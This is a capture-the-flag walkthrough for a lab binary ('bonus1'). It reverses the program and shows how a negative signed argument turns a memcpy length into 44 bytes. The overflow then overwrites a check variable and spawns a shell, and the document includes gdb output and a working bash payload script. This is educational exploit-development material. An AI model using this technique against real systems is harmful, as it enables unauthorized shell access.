# Walkthrough

## Reversing

```c
int main(int argc,char **argv)
{
  int ret;
  char buff [40];
  int num;

  num = atoi(argv[1]);
  if (num < 10) {
    memcpy(buff,argv[2],num * 4);
    if (num == 1464814662) {
      execl("/bin/sh","sh",0);
    }
    ret = 0;
  }
  else {
    ret = 1;
  }
  return ret;
}
```

This seems fun, we have a pretty simple condition, `local_14 == 1464814662`,
but, `local_14` must be less than `10` at the same time... And the only thing
separing this two conditions is a `memcpy`... Which can clearly overflow.

## Exploit

We need tu use that `memcpy` to overwrite the value of `local_14` somehow.

Looking at the local variables we see that `local_14` is above `local_3c`, so,
if we overflow `local_3c`... We could overwrite `local_14` to `1464814662`:
```raw
                **************************************************************
                *                          FUNCTION                          *
                **************************************************************
                int __cdecl main(int argc, char * * argv)
int               EAX:4          <RETURN>                                XREF[1]:     08048448(W)  
int               Stack[0x4]:4   argc
char * *          Stack[0x8]:4   argv                                    XREF[2]:     0804842d(R), 
                                                                                      0804845a(R)  
undefined4        EAX:4          ret                                     XREF[1]:     08048448(W)  
undefined4        Stack[-0x14]:4 num                                     XREF[4]:     0804843d(W), 
                                                                                      08048441(R), 
                                                                                      0804844f(R), 
                                                                                      08048478(R)  
undefined1[40]    Stack[-0x3c]   buff                                    XREF[1]:     08048464(*)  
undefined4        Stack[-0x48]:4 local_48                                XREF[2]:     08048468(W), 
                                                                                      08048482(W)  
undefined4        Stack[-0x4c]:4 local_4c                                XREF[2]:     0804846c(W), 
                                                                                      0804848a(W)  
undefined4        Stack[-0x50]:4 local_50                                XREF[3]:     08048435(*), 
                                                                                      08048470(*), 
                                                                                      08048492(*)  
```

So, `num` must be less than `10`, but, in that case, tha max value could be `9`,
so in the `memcpy` we will copy `9 * 4 = 36` characters, not enought to overflow
`buff`, which has a size of `40`.

The key point here is that the third argument of `memcpy` is unsigned, while
`num` is signed, so, we can pass a negative number as argument, and it will
pass the first condition (`-4 < 10 == true`), and, in the memcpy, the negative
number will be treated as unsigned, so `-4 * 4` would be
`18446744073709551600 (in x64)`. But, that copying that much data will sooner
or later read a invalid memory region and throw a segfault.

We need to find a negative number that when multiplied by `4` and treated as
unsigned, results in `44`, why `44`? Because the payload will be like this:
- 40 bytes offset (to overflow `buff`).
- 4 bytes of the number that will overwrite `num`.

Small negative numbers results in big unsigned numbers, so big negatives
numbers will result in small unsigned numbers.

Let's calculate the max value of a signed in x32 using `bc`
```bash
2^31
2147483648
quit
```

Now let's do some trial and error with a custom program I wrote:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	int num = atoi(argv[1]);
	printf("%zu\n", (size_t)(num * 4));
	return 0;
}
```

We start from the biggest negative and keep decreasing until we find the one
that results in `44`:
```bash
$ ./a.out -2147483648
0

[0] ~/tmp
$ ./a.out -2147483647
4

$ ./a.out -2147483637
44
```

So, our `argv[1]` will be: `-2147483637`.

Let's take the address of `num` so we can check its value, we know we use it
in the `if` to compare, so place a breakpoint there, and print the $esp, then
do the arithmetic:
```bash
=> 0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46

(gdb) p/x $esp
$1 = 0xbffff640

# So:
# 0xbffff640 + 0x3c = 0xbffff67c
```

So now we can forge a silly payload and check the value of the number
(just for fun):
```bash
(gdb) set args -2147483637 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

(gdb) p/d *0xbffff67c
$2 = 1648440162
```

Now let's forge the real payload, it will be something like:
- 40 bytes offset (for `buff`).
- 4 bytes of the number.

The number we need is `1464814662` (`0x574f4c46` in hex), so, the payload will
be:
```bash
offset=$(printf "%40s" " " | tr ' ' 'A')
address='574f4c46'
address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
payload="${offset}${address}"

./bonus1 "-2147483637" "${payload}"
```

And that's all! Another flag!

Check the script at `./resources/exploit.sh`.
